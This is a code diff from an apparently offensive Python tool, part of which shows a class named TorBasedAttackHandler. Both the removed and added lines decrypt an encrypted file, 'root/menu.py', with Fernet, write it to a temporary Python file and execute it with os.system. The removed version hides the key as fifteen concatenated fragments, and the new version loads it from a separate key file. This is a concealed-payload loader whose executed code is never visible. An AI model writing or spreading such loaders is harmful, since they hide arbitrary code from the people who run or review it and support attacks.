@@ -48,48 +48,14 @@ import tempfile
 import os
 import random
 
-key_part1 = "nGD"
-key_part2 = "JA7"
-key_part3 = "-hV"
-key_part4 = "RNz"
-key_part5 = "t3w"
-key_part6 = "TnJ"
-key_part7 = "cfE"
-key_part8 = "HPS"
-key_part9 = "jhx"
-key_part10 = "3gN"
-key_part11 = "DF_"
-key_part12 = "WfR"
-key_part13 = "XzH"
-key_part14 = "oZM"
-key_part15 = "s="
-key = (
-    key_part1
-    + key_part2
-    + key_part3
-    + key_part4
-    + key_part5
-    + key_part6
-    + key_part7
-    + key_part8
-    + key_part9
-    + key_part10
-    + key_part11
-    + key_part12
-    + key_part13
-    + key_part14
-    + key_part15
-).encode()
-cipher = Fernet(key)
-encrypted_file = "root/menu.py"
-with open(encrypted_file, "rb") as f:
-    encrypted_data = f.read()
-decrypted_data = cipher.decrypt(encrypted_data)
+with open("bin/odd/GET-Data/get.key", "rb") as key_file, open("root/menu.py", "rb") as f:
+    cipher = Fernet(key_file.read())
+    decrypted_data = cipher.decrypt(f.read())
+
 with tempfile.NamedTemporaryFile(suffix=".py", delete=True) as temp_file:
     temp_file.write(decrypted_data)
     temp_file.flush()
     os.system(f"python3 {temp_file.name}")
-
 
 class TorBasedAttackHandler:
     def __init__(self):
